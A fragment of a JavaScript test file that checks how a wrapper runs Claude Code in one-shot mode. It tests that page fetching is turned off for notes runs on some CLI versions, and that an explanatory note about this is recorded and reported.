  for (const v of ['2.1.331', '', undefined]) {
    const off = O.oneshotCommand('claude', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com'], cliVersion: v }).args;
    assert.equal(off[off.indexOf('--tools') + 1], 'WebSearch,Read,Glob,Grep', String(v));
    assert.ok(JSON.parse(off[off.indexOf('--settings') + 1]).permissions.deny.includes('WebFetch'));
  }
  const web = O.oneshotCommand('claude', { caps: 'web', cliVersion: '9.9.9' }).args;
  assert.equal(web[web.indexOf('--tools') + 1], 'WebSearch,WebFetch', 'web only: unaffected');
  // the run asks the version once (cached by the caller's reader) and records why fetching was off
  let asked = 0;
  const lines = [{ type: 'result', subtype: 'success', result: 'Done.' }];
  const rec = [];
  const r = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com'], spawn: streamSpawn(lines, rec), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: noJail,
    cliVersion: async () => { asked++; return '2.2.0'; } });
  assert.equal(asked, 1);
  assert.equal(rec[0].args[rec[0].args.indexOf('--tools') + 1], 'WebSearch,Read,Glob,Grep');
  assert.equal(r.sources.note, O.FETCH_OFF_SAY);
  assert.equal(O.FETCH_OFF_SAY, 'page fetching is off for notes runs on this version of Claude Code');
  const gap = { id: 'g', kind: 'ask', agent: 'claude', instruction: 'x', mode: 'pending' };
  G.gapMove(gap, 'filled-by-agent', { text: r.text, used: r.used, sources: r.sources });
  assert.equal(gap.sources.note, O.FETCH_OFF_SAY);
  const same = await O.runOneShot('claude', 'p', { caps: 'web+notes', roots: ['/r'], fetchHosts: ['www.example.com'], spawn: streamSpawn(lines), cliVersion: async () => O.CLAUDE_FETCH_RULES_VERSION, claudeJail: noJail, cliVersion: async () => '2.1.330' });
  assert.equal(same.sources.note, undefined);
  const w = await O.runOneShot('claude', 'p', { caps: 'web', spawn: streamSpawn(lines), claudeJail: noJail, cliVersion: async () => { throw new Error('never asked for a web-only run'); } });
  assert.equal(w.ok, true);
  // botference tk-read check says it
  const { main } = await import('../tk-read-cli.mjs');
  const home = tmp(); fs.mkdirSync(path.join(home, 'Notes'));
  const say = v => { const out = []; main(['check'], { config: () => ({ tk_read_roots: [path.join(home, 'Notes')] }), configPath: '/x/config.json', home, say: s => out.push(s), claudeVersion: () => v }); return out.join('\n'); };
  assert.match(say('2.2.0'), /page fetching is off for notes runs on this version of Claude Code \(2\.2\.0/);
  assert.match(say('2.1.330'), /notes runs may fetch pages from the sites their line names/);
});
